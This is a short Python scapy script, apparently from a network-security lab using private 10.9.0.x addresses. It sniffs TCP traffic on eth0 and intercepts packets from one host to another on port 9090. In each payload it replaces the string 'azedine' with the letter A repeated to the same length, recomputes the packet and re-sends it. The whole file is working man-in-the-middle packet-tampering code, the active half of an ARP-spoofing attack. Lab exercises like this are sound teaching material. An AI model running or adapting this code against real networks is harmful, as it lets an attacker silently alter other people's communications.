#!/usr/bin/env python3
from scapy.all import *
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"


def spoof_pkt(pkt):
    if pkt[Ether].src == MAC_A and pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].dport == 9090:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        if pkt[TCP].payload: 
            # print("this is A src -> M dst")
            # pkt.show()
            oldPayload = pkt[TCP].payload.load.decode('utf-8')
            logging.debug("this is oldPayload: %s", oldPayload)
            searchString = "azedine"
            while searchString in oldPayload:
                index = oldPayload.find(searchString)
                replacement = 'A' * len(searchString)
                newPayload = oldPayload[:index] + replacement + oldPayload[index + len(searchString):]
                oldPayload = newPayload
                logging.debug("this is newPayload: %s", newPayload)
            logging.debug("this is newPayload: %s", oldPayload)
            send(newpkt/oldPayload)
        else:
            send(newpkt)
        ################################################################
f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)